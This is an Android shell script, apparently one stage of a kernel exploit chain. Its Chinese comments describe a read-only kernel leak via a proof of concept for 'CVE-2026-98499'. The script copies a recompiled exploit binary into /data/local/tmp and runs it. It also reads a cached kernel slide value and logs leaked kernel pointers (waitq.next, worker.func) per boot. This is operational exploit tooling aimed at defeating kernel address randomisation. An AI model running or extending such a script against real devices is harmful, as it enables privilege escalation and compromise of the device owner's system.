#!/system/bin/sh
# S1 anchor 只读泄漏：用 6.18 布局（我们的 base-88 公式等价 index 2284/2285）
# 跑 CVE-2026-98499 PoC，取 waitq.next / worker.func。不触发 UAF、不写内核。
# 输入二进制：/sdcard/Download/DSH-Go/poc98499_618（已按 2284/2285 重编译）
set -u
DIR=/sdcard/Download/DSH-Go/99491
BOOT=$(cat /proc/sys/kernel/random/boot_id 2>/dev/null)
RUN="$DIR/$BOOT"
mkdir -p "$RUN" 2>/dev/null
F="$RUN/s1_anchor.txt"
{
  echo "## boot_id=$BOOT"
  echo "## date=$(date 2>/dev/null)"
  echo "## slide_cache=$(cat /data/local/tmp/.lhasa_slide 2>&1)"
  echo "## deploy"
  cp /sdcard/Download/DSH-Go/poc98499_618 /data/local/tmp/poc98499_618 2>&1
  chmod 755 /data/local/tmp/poc98499_618 2>&1
  echo "## run anchor"
  /data/local/tmp/poc98499_618 2>&1
  echo "## anchor_rc=$?"
} > "$F" 2>&1
chmod 644 "$F" 2>/dev/null
cat "$F"
echo "S1_ANCHOR_DONE file=$F"
